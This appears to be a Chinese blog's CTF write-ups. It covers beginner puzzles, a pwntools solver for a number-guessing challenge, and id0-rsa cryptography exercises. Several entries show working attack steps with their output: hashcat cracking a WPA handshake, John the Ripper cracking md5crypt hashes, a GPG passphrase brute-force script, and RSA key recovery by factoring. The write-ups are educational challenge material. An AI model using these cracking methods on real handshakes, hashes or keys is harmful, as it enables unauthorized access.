veryeasyRSARSA-tool直接上啦~ flagPCTF{19178568796155560423675975774142829153827883709027717723363077606260717434369} [Ｘ] 神秘的文件file/binwalk指令得到这是一个exT文件系统数据，strings结果也奇怪 索性打开文件看，发现有一堆\x00 但是往下翻发现有些其他东西 然后找到P/C/T，想着能不能移除\x00得到flag 然后的确得到了，但是结果失败了 因为错位包括前后错位，所以直接拼凑也是会失败的 看来还是需要文件系统，用命令 mount -o loop haha.f38a74f55b4e193561d1b707211cf7eb /mnt 装载文件系统之后，发现每个文件里一个字符，所以写出脚本 1234567import oss = ""for i in range(0, 254): f = open(str(i), "r") s += f.read() f.close()print(s) 得到flag flagPCTF{P13c3_7oghter_i7} [Ｘ] 公倍数1s大概做1e8的计算，所以可以直接暴力算就好 代码就没必要放了吧~ flagPCTF{233333333166666668} [Ｘ] Easy Crackme 算法很简单，第一位异或以后，后面24位每6位一组和对应位置异或，然后进行比较 写出逆算法 12345678910111213141516#include &lt;bits/stdc++.h&gt;using namespace std;unsigned char a[27] = &#123; 0xFB, 0x9E, 0x67, 0x12, 0x4E, 0x9D, 0x98, 0xAB, 0x00, 0x06, 0x46, 0x8A, 0xF4, 0xB4, 0x06, 0x0B, 0x43, 0xDC, 0xD9, 0xA4, 0x6C, 0x31, 0x74, 0x9C, 0xD2, 0xA0, 0&#125;;int ar[6] = &#123;-35,51,84,53,-17,-85&#125;;int main()&#123; a[0]^=0xab; for(int i=0;i&lt;25;++i)&#123; a[i+1]^=ar[i%6]; &#125; puts((const char *)a); return 0;&#125; flagPCTF{r3v3Rse_i5_v3ry_eAsy} [Ｘ] Secret打开，F12，网络，刷新，得到 flagPCTF{Welcome_to_phrackCTF_2016} [Ｘ] 爱吃培根的出题人提示够明显了，小写字母-&gt;A，大写字母-&gt;B，培根密码解密 flag[Ｘ] Easy RSA提示明显 flagPCTF{3a5Y} [Ｘ] ROPGadget flagPCTF{94C38B08890A5BC3} [Ｘ] 取证搜索得软件名Volatility flagPCTF{volatility} [Ｘ] 熟悉的声音摩尔斯-&gt;凯撒 flagPCTF{PHRACKCTF} [Ｘ] Baby&#39;s Crack很简单的加密，都不用写逆算法了，直接爆破吧！ 123456789101112131415161718192021222324252627282930#include &lt;string.h&gt;#include &lt;stdio.h&gt;char a[] = "jeihjiiklwjnk&#123;ljj&#123;kflghhj&#123;ilk&#123;k&#123;kij&#123;ihlgkfkhkwhhjgly";char b[] = "jeihjiiklwjnk&#123;ljj&#123;kflghhj&#123;ilk&#123;k&#123;kij&#123;ihlgkfkhkwhhjgly";//这里可以为空，我只是方便设置长度搞得int main()&#123; int len = strlen(a); for(int i=0;i&lt;len;++i)&#123; int ok = 0; for(int j=32;j&lt;255&amp;&amp;!ok;++j)&#123; int cur = j; if ( j &gt; 47 &amp;&amp; j &lt;= 96 )&#123; j += 53; &#125;else if ( j &lt;= 46 )&#123; j += j % 11; &#125;else&#123; j = 61 * (j / 61); &#125; if(j==a[i])&#123; //ok=1;这里加上注释是为了确认每次解的唯一 b[i]=cur; putchar(cur); &#125; j=cur; &#125; putchar('\n'); &#125; puts(b); return 0;&#125; 得到的结果转ASCII就好 flagPCTF{You_ar3_Good_Crack3R} [Ｘ] Help!! 打开word没有发现flag，binwalk/strings也没有 于是解压word，发现有两张图，OK flagPCTF{You_Know_moR3_4boUt_woRd} [Ｘ] Shellcode flagPCTF{Begin_4_good_pwnn3r} [Ｘ] A Piece Of Cake一眼就看出来是单表替换，quip解决 flagPCTF{substitutepassisveryeasyyougotit} [Ｘ] -.-字符串一目了然 flag522018D665387D1DA931812B77763410 [Ｘ] 德军的密码 然后解得flag flagWELCOMECISRG [Ｘ] 握手包下载发现是个cap包，中文搜索无果，搜&quot;Kali handshake crack&quot;，搜到hashcat，找到这个网站 照葫芦画瓢 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263A:\Downloads\Compressed\hashcat-4.1.0λ hashcat64.exe -m 2500 9640_1525972232.hccapx rockyou.txthashcat (v4.1.0) starting...* Device #1: WARNING! Kernel exec timeout is not disabled. This may cause "CL_OUT_OF_RESOURCES" or related errors. To disable the timeout, see: https://hashcat.net/q/timeoutpatch* Device #2: Intel's OpenCL runtime (GPU only) is currently broken. We are waiting for updated OpenCL drivers from Intel. You can use --force to override, but do not report related errors.nvmlDeviceGetFanSpeed(): Not SupportedOpenCL Platform #1: NVIDIA Corporation======================================* Device #1: GeForce GTX 965M, 512/2048 MB allocatable, 8MCUOpenCL Platform #2: Intel(R) Corporation========================================* Device #2: Intel(R) HD Graphics 530, skipped.* Device #3: Intel(R) Core(TM) i7-6700HQ CPU @ 2.60GHz, skipped.Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Applicable optimizers:* Zero-Byte* Single-Hash* Single-Salt* Slow-Hash-SIMD-LOOPMinimum password length supported by kernel: 8Maximum password length supported by kernel: 63Watchdog: Temperature abort trigger set to 90cDictionary cache built:* Filename..: rockyou.txt* Passwords.: 14344390* Bytes.....: 139921496* Keyspace..: 14344383* Runtime...: 3 secse56452df7244988624af174fa692d81d:560a64ffe917:b8ee65ac640b:Flag_is_here:11223344Session..........: hashcatStatus...........: CrackedHash.Type........: WPA/WPA2Hash.Target......: Flag_is_here (AP:56:0a:64:ff:e9:17 STA:b8:ee:65:ac:64:0b)Time.Started.....: Fri May 11 01:17:21 2018 (3 secs)Time.Estimated...: Fri May 11 01:17:24 2018 (0 secs)Guess.Base.......: File (rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.Dev.#1.....: 91621 H/s (10.79ms) @ Accel:32 Loops:16 Thr:1024 Vec:1Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) SaltsProgress.........: 593466/14344383 (4.14%)Rejected.........: 331322/593466 (55.83%)Restore.Point....: 0/14344383 (0.00%)Candidates.#1....: 123456789 -&gt; rinabelleHWMon.Dev.#1.....: Temp: 68c Util: 98% Core:1151MHz Mem:2505MHz Bus:16Started: Fri May 11 01:17:04 2018Stopped: Fri May 11 01:17:25 2018 flagflag{11223344} [ ] Crypto[Ｘ] Medium RSA1234567891011121314λ openssl rsa -pubin -in pubkey.pem -text -modulusWARNING: can't open config file: /usr/local/ssl/openssl.cnfPublic-Key: (256 bit)Modulus: 00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:ddExponent: 65537 (0x10001)Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDryigb/+l/vjDdAgMBAAE=-----END PUBLIC KEY----- 然后分解这个数，用RSAtools输出私钥文件 12345678910111213141516λ python rsatool.py -f PEM -o key.pem -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048 041239Using (p, q) to initialise RSA instancen =c2636ae5c3d8e43ffb97ab09028f1aac6c0bf6cd3d70ebca281bffe97fbe30dde = 65537 (0x10001)d =1806799bd44ce649122b78b43060c786f8b77fb1593e0842da063ba0d8728bf1p = 275127860351348928173285174381581152299 (0xcefbb2cf7e18a98ebedc36e3e7c3b02b)q = 319576316814478949870590164193048041239 (0xf06c28e91c8922b9c236e23560c09717)Saving PEM as key.pem 之后解密 λ openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag flagPCTF{256b_i5_m3dium} [ ] BrokenPicflag[Ｘ] hard RSARSA 衍生算法——Rabin 算法攻击条件 Rabin 算法的特征在于 $e=2​$。 攻击原理 密文： $c=m^2\mod n$ 解密： 计算出 $m^p$ 和 $m^q$： $$m_p=\sqrt{c}\mod p$$ $$m_q=\sqrt{c}\mod q$$ 用扩展欧几里得计算出 $y_p$ 和 $y_q$： $y_p⋅p+y_q⋅q=1$ 解出四个明文： $$a=(y_p⋅p⋅m_q+y_q⋅q⋅m_p)modn$$ $$b=n−a$$ $$c=(y_p⋅p⋅m_q−y_q⋅q⋅m_p)modn$$ $$d=n−c$$ 注意：如果 $$p≡q≡3(mod4)$$，则 $$mp=c^{\frac{1}{4}(p+1)}modp$$ $$mq=c^{\frac14(q+1)}modq$$ 而一般情况下，$p≡q≡3(mod4)p $是满足的，对于不满足的情况下，请参考相应的算法解决。 1234567891011121314151617181920212223242526272829303132333435363738#!/usr/bin/python# coding=utf-8import gmpy2import stringfrom Crypto.PublicKey import RSA# 读取公钥参数with open('pubkey.pem', 'r') as f: key = RSA.importKey(f) N = key.n e = key.ewith open('flag.enc', 'r') as f: cipher = f.read().encode('hex') cipher = string.atoi(cipher, base=16) # print cipherprint "please input p"p = int(raw_input(), 10)print 'please input q'q = int(raw_input(), 10)# 计算yp和yqinv_p = gmpy2.invert(p, q)inv_q = gmpy2.invert(q, p)# 计算mp和mqmp = pow(cipher, (p + 1) / 4, p)mq = pow(cipher, (q + 1) / 4, q)# 计算a,b,c,da = (inv_p * p * mq + inv_q * q * mp) % Nb = N - int(a)c = (inv_p * p * mq - inv_q * q * mp) % Nd = N - int(c)for i in (a, b, c, d): s = '%x' % i if len(s) % 2 != 0: s = '0' + s print s.decode('hex') flagPCTF{sp3ci4l_rsa}]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Misc</tag>
        <tag>PWN</tag>
        <tag>Web</tag>
        <tag>Rev</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[*ctf magic_number WP]]></title>
    <url>%2Fctf-magic-number-WP%2F</url>
    <content type="text"><![CDATA[99次内猜14个[0,1023]内的数，那肯定是不仅二分而且要整体二分了 简单说来是 于是可以写出代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#!/bin/python3from pwn import *r = remote("47.89.18.224", 10011)nums = []def query(l, r, rm): """ Send the query and get answer :param l: &lt;int&gt; left bound :param r: &lt;int&gt; Right bound :param rm: &lt;remote&gt; Remote process :return: Amount of numbers """ payload ="? " + str(l) + " " + str(r) + "\n" rm.send(payload) res = int(rm.recv()) print payload + str(res) return resdef find(l, r, k, rm): """ Guess numbers :param l: &lt;int&gt; Left bound :param r: &lt;int&gt; Right bound :param k: &lt;int&gt; Amount of numbers :param rm: &lt;remote&gt; Remote process :return: None """ global nums if l == r - 1 and k == 1: nums.append(l) return None m = (l + r) // 2 K = query(l, m, rm) if K: find(l, m, K, rm) if K - k: find(m, r, k - K, rm)def gate(rm): """ gate :param rm: &lt;remote&gt; Remote process :return: None """ global nums rm.recvuntil("n = ") k = int(rm.recv()) nums = [] find(0, 1024, k, r) nums.sort() print(nums) rm.interactive()gate(r)gate(r)gate(r)# 这里gate(r)一次就过一关，多少关我也忘了]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PPC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[id0-rsa WP合集]]></title>
    <url>%2Fid0-rsa-WP%E5%90%88%E9%9B%86%2F</url>
    <content type="text"><![CDATA[忙里偷闲做做题wwwwwwwwwwwww 进度表 Intro to Hashing Intro to PGP Hello PGP Hello OpenSSL Intro to RSA Caesar Hello Bitcoin Ps and Qs Affine Cipher Cut and Paste Attack On AES-ECB Rail Fence Factoring RSA With CRT Optimization Easy Passwords RSA Modulus Factorization Fast Hashing Passwords Vigenère Monoalphabetic Cipher Salt Alone Won&#39;t Save You CCA on Textbook RSA AES-CTR with Nonce Reuse Bad Entropy Double Strength Affine Rainbow Table Hash Chain Elliptic Curve Private Key Recovery ECDSA Nonce Recovery Slightly harder passwords Upgraded Affine Fvtavat Xrl Erpbirel Insufficient Key Size Håstad&#39;s Broadcast Attack CBC Padding Attack Breaking PDF Passwords Vigenère + Rail Fence Recover the secret phone number Optimal Backpack Allocation Insecure PRNG Playfair CRIMEs against TLS Bleichenbacher&#39;s CCA2 on RSA Backdoored PRNG Not So Safe Primes DSA with LCG nonces Intro to Hashing12345# Python&gt;&gt;&gt; import hashlib&gt;&gt;&gt; hashlib.md5(hashlib.sha256('id0-rsa.pub').hexdigest()).hexdigest()# 'b25d449d86aa07981d358d3b71b891de' Intro to PGP1234567891011# bashroot@kali:~/Documents/id0-rsa# touch Intro_to_PGP.keyroot@kali:~/Documents/id0-rsa# gpg --import Intro_to_PGP.key gpg: key 2503D0F1A81B09D4: public key "id0-rsa.pub (http://id0-rsa.pub) &lt;id0rsa.pub@gmail.com&gt;" importedgpg: Total number processed: 1gpg: imported: 1root@kali:~/Documents/id0-rsa# touch Intro_to_PGP.txtroot@kali:~/Documents/id0-rsa# gpg -d Intro_to_PGP.txt# Thank you Phil Zimmermann! Hello PGP123456789101112131415161718192021#!/bin/bashcount=1while read WORD; do gpg --batch --passphrase $WORD --decrypt test.txt 2&gt;/dev/null if [ $? -eq 0 ]; then echo echo $WORD exit fi count=$(( count + 1 )) if [ $((count % 1000)) -eq 0 ]; then echo $count fidone &lt; words# passionately apathetic# seamanship# gpg: AES256 encrypted data# gpg: encrypted with 1 passphrase Hello OpenSSL繁琐的解法12345678910111213141516171819202122232425262728293031323334# bashroot@kali:~/Documents/id0-rsa/Hello_OpenSSL# openssl rsa -in priva.pem -textPrivate-Key: (256 bit)modulus: 00:e6:dc:a0:a5:26:5d:39:95:0c:7e:e3:b7:a1:31: 96:47:87:00:2c:1b:56:ba:2e:54:ce:b4:30:db:ff: 09:95:9dpublicExponent: 65537 (0x10001)privateExponent: 00:8f:67:e1:8a:75:28:57:ca:94:76:85:f1:dd:79: b6:05:0e:35:05:e7:f9:ed:da:23:e6:de:14:aa:22: d9:78:a9prime1: 00:fd:99:07:3e:67:03:c1:72:2a:96:81:ab:9a:29: db:d7prime2: 00:e9:0c:76:fe:de:98:c1:9d:d3:c8:30:c0:e4:3a: 8b:abexponent1: 00:b4:a6:37:17:c7:d0:50:14:20:ac:58:30:c2:c0: 00:bfexponent2: 00:c5:87:27:25:07:8e:fa:2c:c7:e0:9a:52:24:1f: eb:59coefficient: 00:e3:bd:9b:a2:47:11:68:33:2d:80:fe:7d:ed:34: de:fcwriting RSA key-----BEGIN RSA PRIVATE KEY-----MIGtAgEAAiEA5tygpSZdOZUMfuO3oTGWR4cALBtWui5UzrQw2/8JlZ0CAwEAAQIhAI9n4Yp1KFfKlHaF8d15tgUONQXn+e3aI+beFKoi2XipAhEA/ZkHPmcDwXIqloGrminb1wIRAOkMdv7emMGd08gwwOQ6i6sCEQC0pjcXx9BQFCCsWDDCwAC/AhEAxYcnJQeO+izH4JpSJB/rWQIRAOO9m6JHEWgzLYD+fe003vw=-----END RSA PRIVATE KEY----- 123456789# Python&gt;&gt;&gt; n = 0xe6dca0a5265d39950c7ee3b7a131964787002c1b56ba2e54ceb430dbff09959d&gt;&gt;&gt; d = 0x8f67e18a752857ca947685f1dd79b6050e3505e7f9edda23e6de14aa22d978a9&gt;&gt;&gt; c = 0x6794893f3c47247262e95fbed846e1a623fc67b1dd96e13c7f9fc3b880642e42&gt;&gt;&gt; hex(pow(c,d,n))'0x310f2eb0634ed1ab' 一行123# bashroot@kali:~/Documents/id0-rsa/Hello_OpenSSL# openssl rsautl -decrypt -in &lt;(xxd -r -p cipher) -inkey priva.pem -raw | xxd -p -c 8 | tail -n1# 310f2eb0634ed1ab Intro to RSA12345678# Python&gt;&gt;&gt; (e, N) = (0x3, 0x64ac4671cb4401e906cd273a2ecbc679f55b879f0ecb25eefcb377ac724ee3b1)&gt;&gt;&gt; d = 0x431d844bdcd801460488c4d17487d9a5ccc95698301d6ab2e218e4b575d52ea3&gt;&gt;&gt; c = 0x599f55a1b0520a19233c169b8c339f10695f9e61c92bd8fd3c17c8bba0d5677e&gt;&gt;&gt; hex(pow(c,d,N))'0x4d801868d894740b2be29309fcd3edcd51bd2c2a685028b89290f9268c727581' Caesar 但是交了以后就显示错误，不知道为什么…… 破案了，因为凯撒之后的原文是 Hello Bitcoin按资料算就是了 然而我找到了在线计算的工具;D 按照比特币wiki的说法，计算过程大概是这样的： 首先我们生成一个私钥 获取对应的公钥 获得公钥的SHA256散列值 获取上一步结果的RIPEMD-160散列值 在散列值前加入版本号 计算上一步结果的SHA-256散列 取第二个SHA-256散列值的前四字节作为地址校验和 在第四步的结果末尾加入校验和 进行Base28编码 You already solved this one! Solution: 18GZRs5nx8sVhF1xVAaEjKrYJga4hMbYc2 Ps and Qsfactordb.com 完成 噫，年老体衰也就算了，眼神也不好了，其实没有分解成功 然后开了个yafu，结果还是很不错的，我做出来了以后依然没有分解出答案 先是打开题目看了下，说是生成的素数low entropy(低熵)吗，然后打开论文大概看了下，就说生成素数有毛病，就猜测是不是共同素数的锅 结果还真是 先读两个公钥，然后gcd了一波，成功 123456789# pythondef gcd(a, b): if b == 0: return a else: return gcd(b, a%b)#q = gcd(3367646059138877442579820972831876412006279917097809082279412851693123955964282545145500497393579598954859534731890460229194372339215098506788375050698427369, 9055404640500300109405801152935663267176218320785348541566663982172162265778445107320065187449062375525002632043722734566593185461999286625234528036605141)#print(q) 然后懒得写求拓展欧几里得求逆元了，直接拿工具了 补全代码 123456789101112131415161718192021# pythondef gcd(a, b): if b == 0: return a else: return gcd(b, a%b)#q = gcd(3367646059138877442579820972831876412006279917097809082279412851693123955964282545145500497393579598954859534731890460229194372339215098506788375050698427369, 9055404640500300109405801152935663267176218320785348541566663982172162265778445107320065187449062375525002632043722734566593185461999286625234528036605141)#print(q)#print(9055404640500300109405801152935663267176218320785348541566663982172162265778445107320065187449062375525002632043722734566593185461999286625234528036605141//q)n = 9055404640500300109405801152935663267176218320785348541566663982172162265778445107320065187449062375525002632043722734566593185461999286625234528036605141d = 5595429548525262877923879998920954875376781621351655927785581040054379710925982991727871918848397312612397095534700830662119225899345003601005897300178945c = 0xf5ed9da29d8d260f22657e091f34eb930bc42f26f1e023f863ba13bee39071d1ea988ca62b9ad59d4f234fa7d682e22ce3194bbe5b801df3bd976db06b944daprint(hex(pow(c,d,n))[2:])# f6a1df363229c6ec Affine Cipher暴力一下肉眼看吧 是的，暴力以后搜索THE，出现次数最多的那个基本就确定了 不过得感叹一下 ……自己越来越蠢了……求个逆元，不是a*b%c==1则mod c下ab互为逆元么，我™a的b次方是要闹哪样…… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152# pythonplain = "BOHHIKBI,OZ,REI,WZRIKZIR,EX.,BOHI,RO,KISU,XSHO.R,ICBSG.WYISU,OZ, WZXZBWXS,WZ.RWRGRWOZ.,.IKYWZP,X.RKG.RIT,REWKT,DXKRWI.,RO,DKOBI..,ISIBRKOZWB,DXUHIZR.F,NEWSI,REI,.U.RIH,NOKA.,NISS,IZOGPE, OKHO.R,RKXZ.XBRWOZ.Q,WR,.RWSS,.G IK., KOH,REI,WZEIKIZR,NIXAZI..I.,O ,REI,RKG.R,MX.IT,HOTISF,BOHDSIRISU,ZOZKIYIK.WMSI,RKXZ.XBRWOZ.,XKI,ZOR,KIXSSU,DO..WMSIQ,.WZBI, WZXZBWXS,WZ.RWRGRWOZ.,BXZZORXYOWT,HITWXRWZP,TW.DGRI.F,REI,BO.R,O ,HITWXRWOZ,WZBKIX.I.,RKXZ.XBRWOZ,BO.R.Q,SWHWRWZP,REIHWZWHGH,DKXBRWBXS,RKXZ.XBRWOZ,.WJI,XZT,BGRRWZP,O ,REI,DO..WMWSWRU, OK,.HXSS,BX.GXS,RKXZ.XBRWOZ.QXZT,REIKI,W.,X,MKOXTIK,BO.R,WZ,REI,SO..,O ,XMWSWRU,RO,HXAI,ZOZKIYIK.WMSI,DXUHIZR., OK,ZOZKIYIK.WMSI.IKYWBI.F,NWRE,REI,DO..WMWSWRU,O ,KIYIK.XSQ,REI,ZIIT, OK,RKG.R,.DKIXT.F,HIKBEXZR.,HG.RMI,NXKU,O ,REIWK,BG.ROHIK.Q,EX..SWZP,REIH, OK,HOKI,WZ OKHXRWOZ,REXZ,REIU,NOGST,OREIKNW.I,ZIITF,X,BIKRXWZ,DIKBIZRXPI,O , KXGT,W.,XBBIDRIT,X.,GZXYOWTXMSIF,REI.I,BO.R.,XZT,DXUHIZR,GZBIKRXWZRWI.BXZ,MI,XYOWTIT,WZ,DIK.OZ,MU,G.WZP,DEU.WBXS,BGKKIZBUQ,MGR,ZO,HIBEXZW.H,ICW.R.,RO,HXAI,DXUHIZR.OYIK,X,BOHHGZWBXRWOZ.,BEXZZIS,NWREOGR,X,RKG.RIT,DXKRUF"mp = "ABCDEFGHIJKLMNOPQRSTUVWXYZ ,."dict = &#123;&#125;inv_dict = &#123;&#125;for i in range(0, len(mp)): dict[i] = mp[i] dict[mp[i]] = i# print(dict)for i in range(1, 29): for j in range(1, 29): if i*j%29 == 1: inv_dict[i] = j breakprint(inv_dict)newarr = []for i in range(0, len(plain)): newarr.append(dict[plain[i]])# print(newarr)def decry(c, a, b): s = "" for i in range(0, len(c)): s += dict[(c[i]-b+29)*inv_dict[a]%29] return sfor i in range(1, 29): for j in range(0, 29): print(decry(newarr, i, j)) print(i, j)for j in range(0, 29): print(decry(newarr, 0, j)) print(0, j)# plain = "RLZZC SCIZJB"## newarr = []## for i in range(0, len(plain)):# newarr.append(dict[plain[i]])## print(decry(newarr, 2, 3)) 1234567λ pythonPython 3.6.1 on win32Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; import hashlib&gt;&gt;&gt; plain = "COMMERCE ON THE INTERNET HAS COME TO RELY ALMOST EXCLUSIVELY ON FINANCIAL INSTITUTIONS SERVING ASTRUSTED THIRD PARTIES TO PROCESS ELECTRONIC PAYMENTS. WHILE THE SYSTEM WORKS WELL ENOUGH FORMOST TRANSACTIONS, IT STILL SUFFERS FROM THE INHERENT WEAKNESSES OF THE TRUST BASED MODEL. COMPLETELY NONREVERSIBLE TRANSACTIONS ARE NOT REALLY POSSIBLE, SINCE FINANCIAL INSTITUTIONS CANNOTAVOID MEDIATING DISPUTES. THE COST OF MEDIATION INCREASES TRANSACTION COSTS, LIMITING THEMINIMUM PRACTICAL TRANSACTION SIZE AND CUTTING OFF THE POSSIBILITY FOR SMALL CASUAL TRANSACTIONS,AND THERE IS A BROADER COST IN THE LOSS OF ABILITY TO MAKE NONREVERSIBLE PAYMENTS FOR NONREVERSIBLESERVICES. WITH THE POSSIBILITY OF REVERSAL, THE NEED FOR TRUST SPREADS. MERCHANTS MUSTBE WARY OF THEIR CUSTOMERS, HASSLING THEM FOR MORE INFORMATION THAN THEY WOULD OTHERWISE NEED. A CERTAIN PERCENTAGE OF FRAUD IS ACCEPTED AS UNAVOIDABLE. THESE COSTS AND PAYMENT UNCERTAINTIESCAN BE AVOIDED IN PERSON BY USING PHYSICAL CURRENCY, BUT NO MECHANISM EXISTS TO MAKE PAYMENTSOVER A COMMUNICATIONS CHANNEL WITHOUT A TRUSTED PARTY."&gt;&gt;&gt; hashlib.md5(plain.encode()).hexdigest()'880cabd53df2f03050a7214d3ae30a07' Cut and Paste Attack On AES-ECB截取一哈就行 ECB的问题就在于同样的明文总是对应相同的密文，而AES又是分组加密，所以我们只需要16字节截一段，然后从截出来的字段里拼出Deposit amount: One million dollars就吼啦 然后把对应的密文组合提交就好啦 Rail Fence栅栏密码 不是栅栏密码，丢人 就是这个名字，密码是17 然而提交又失败……是不是要加空格？？？ 和凯撒那题一样的问题 Factoring RSA With CRT Optimization看看论文 论文结论放得挺快的，喜欢 1234567891011121314151617181920&gt;&gt;&gt; e = 0x10001&gt;&gt;&gt; n = 0x90def3c2c91ae9bf6089ec8857960d567fdbcd7c2c3ea713046977231e65f44e1b91550971d4e5d43b51675fae4ba640add3af02dad4bf68c3ddef3a98907e1e01156de7a4474d9fce2ba8c055f44673c703a72a111a06f8a7b2fe582463938d802e91630e1e1b5483b1774e608eb4368c6bbf4da375319d9a2799bf8a5ae453&gt;&gt;&gt; x = 0xdeadc0de&gt;&gt;&gt; y = 0x17d7f90a4597fb2bbbb41d1a70f505f0d8c5cb53faaafea259150eb6910fb08fbf1ba40e42de70c596fb0032d132c9c6ce46c650999ad5f14a990d205984260146e2949b819dc8732beceed452701d88b2c8723b410fce739009df89930424c566af5102403981c26c3e75d9c62065a347e815b26984dcd3b5f02fc8a8092051&gt;&gt;&gt; def gcd(a,b):... if b == 0:... return a... else:... return gcd(b,a%b)...&gt;&gt;&gt; gcd(pow(y,e,n)-x,n)9966524937284363425885222065976539626835093420150865305435384403545526100948308275937186399398105835105908301433416877915451315435074364352622884631548129&gt;&gt;&gt; p = gcd(pow(y,e,n)-x,n)&gt;&gt;&gt; q = n//p&gt;&gt;&gt; n%p0&gt;&gt;&gt; print(p)9966524937284363425885222065976539626835093420150865305435384403545526100948308275937186399398105835105908301433416877915451315435074364352622884631548129&gt;&gt;&gt; print(q)10207350221528968021374239537567355734439270587735020516681487302155761468885207397982418037573103389660473080952277752719230542349569271803978030721660851 Easy Passwords暴力/去他们推特看看 Hint for 1: the &quot;easy&quot; passwords are all standard English words 很惭愧，原本没思路的，又学习了一下别人怎么用John the Ripper的 123456789101112131415161718192021222324252627282930313233343536root@kali:~# touch crackitroot@kali:~# john --wordlist=/usr/share/dict/words crackit Created directory: /root/.johnWarning: detected hash type "md5crypt", but the string is also recognized as "aix-smd5"Use the "--format=aix-smd5" option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 10 password hashes with no different salts (md5crypt, crypt(3) $1$ [MD5 128/128 SSE2 4x3])Press 'q' or Ctrl-C to abort, almost any other key for statuseach (?)in (?)letter (?)list (?)of (?)order (?)second (?)the (?)this (?)word (?)10g 0:00:00:04 DONE (2018-05-07 07:53) 2.421g/s 24502p/s 24502c/s 176147C/s woolly..word'sWarning: passwords printed above might not be all those cracked# 这里直接看是不知道交什么的，id0-rsa好像都是这样做的root@kali:~# john --show crackit?:the?:second?:letter?:of?:each?:word?:in?:this?:list?:in?:order11 password hashes cracked, 0 left RSA Modulus Factorization有公钥、私钥，分解N 有人提示 You may want to look at end of section 1 of this paper to get an idea of how to tackle this. 但是懒人选择直接用工具 123456789101112131415λ python rsatool.py -f PEM key.pem -n 2575379069244619122811590270693932708961682118615086945187580561953482470842235 5391264253236312033342930767629026955594380914791828872789640882880456756317355718989951748134910495292317107822354638062542536621806610548119524360577494257082085388892230653871347635789064083634194556923152378748383913055689941464591534636606264605505256200032003073128045380287795929441895659897956729518691264242454587153279087011099643014705274937963488514996712634166563179373202236856266518026166326484283485368106496495400924862033175617707157820195751946135848383888076352630565287208026865192435711425148588227314034233872575399 -d 17105402368913594732268140576016021009260884834703468214454459966320267707293844817833310635571150638333054368126620841170740802501167335402566350357845884586982802288930597441429262542859551082213714762867946512961388972561696317770839625342858127315991460791480206023627821121730752214777828377914024156239192555174948311918712437146465305330571121417401154082076772433310857936602097318370602240544385942653856271345622469333448979309288295132145434251447399809135938564905989171217097472641153308592366164932415033656821923922166211242186853476413476873462490965233576571621275866183349806774845359965178419609761Using (n, d) to initialise RSA instancen =cc0262c3764f6d1bfa485a88c0566a6d68cb89ac382fbbc577a4862bdbce111bb59960ea787f132e3fddb9c914d0d11d156dd433a2adab9084d48cf58f58b42804805966ecd318ad19218791e14e19a8d0cf3441e219e5e1395eb5dba1fba11d94321a34eb536c51f4c44c5987e74a467b5fe2eae8d2725d63f24feebfd9ca746de93b6fd74ed82fed7dbfc3a84b0a425f52503ab71908a13ac11a9d52211042290ae2886626f67935dc78b7d86ba76d3c5e085a003dff06f914187acc368f904613cbd3d52f36c8b0535f9dfeec2737744ad8be51f66e1d470261a7fd7c6da277dbd2f213b44d9e8242a8a5b121acc8710baed3d244004e4ca560d58e756ba7e = 65537 (0x10001)d =87803a2b0b44dbfa8e354a74b41371a2f3cce4c74f965cc85e9c1745c03bd15f2f320d8e0eb4907fd289a9a16642fff1aa4f0577ba6051a8aea12272e3600e60da0489dcf4058dc942fce337c0870841f956f6a59fd085c01f43c9d474755660f81283178d0a1ed31c98d9014a6414105657acb74c26a3316676062354a80a70335a670675f439dec08803def4892c4d99e20fbe1975d7673679ac6f16835307ce59971c865d71edeea9ed1a93c70a37e283f270dea8499271268d86f7fc4a1b4f64041833c62a057dfb0b48f1c4f6d351673238a3de3b4506eb2472aaf90b914e791c3a723464d9169d5eab8e0a3f8a42dedb065829e8b533a89dd3ba0a00a1p =cd8872868e62777d31e8cf8a694df3096bfa246463d4cfbda7f22f31d0b0f2d6d99996a099c79f312915018c475b2a5090f08ffa67400985dbbc8c04466ddf07414b40be264b98f8422ae053dfd53d4845eda2fda826cabb9237bb432f9e99862c6b75aeebc1b79e3a780fd813e05e73c9bbb521c05539e998031c876a2e7497q = fe1a2971eee591830144ccb525befca29aa5a84c7b63510c60a491f09a185a787250bc5ea8c024896a4ec6312a8bf391fe76e15a50d7609cfb27ac18342b7dfd3d20ed94a85d62f83454ea77aa26471881aad95c63b0e890daabc71991f8051c2ec5956f8855a13e34c1e11e3a8d9abc43d813c6f9f42e34e0c75b35d2f15371 Fast Hashing Passwords母鸡 就是给了一个简单密码表，顺着跑个散列值表，然后排序，找出散列值最大最小的两个 有点考验电脑 Python写的排序那一步会有Memory Error（主要是ACM遗留下来的习惯，写算法写cpp比较习惯） 首先是下载rockyou list，算SHA-256值（其实这里没必要，但是我觉得可能会有用，所以算一个保存着了） 123456789101112131415161718192021import hashlibdef hash(strings): return str(hashlib.sha256(strings).hexdigest())f = open(r"rockyou.txt", "rb")w = open(r"rawsha256.txt", "w")s = f.readline()[:-1]arr = []print(hash("".encode()))i = 1while s != "": w.write(hash(s)+'\n') arr.append(hash(s)) s = f.readline()[:-1]f.close()w.close() 然后排序输出最低最高的位置 